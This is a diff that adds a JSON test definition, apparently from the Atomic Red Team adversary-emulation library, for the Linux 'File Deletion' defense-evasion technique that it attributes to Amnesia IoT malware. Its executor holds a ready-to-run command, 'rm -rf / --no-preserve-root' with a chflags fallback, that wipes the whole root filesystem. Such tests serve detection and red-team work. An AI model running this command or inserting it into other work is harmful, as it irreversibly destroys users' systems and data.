@@ -1,0 +1,23 @@
+{
+    "name": "Delete Filesystem - Linux",
+    "description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment. ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "executor": {
+        "command": "[ \"$(uname)\" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null\n",
+        "name": "sh",
+        "type": "Command Executor"
+    },
+    "id": "T1070.004",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "File Deletion",
+    "source": "ART",
+    "uuid": "f3aa95fe-4f10-4485-ad26-abf22a764c52",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
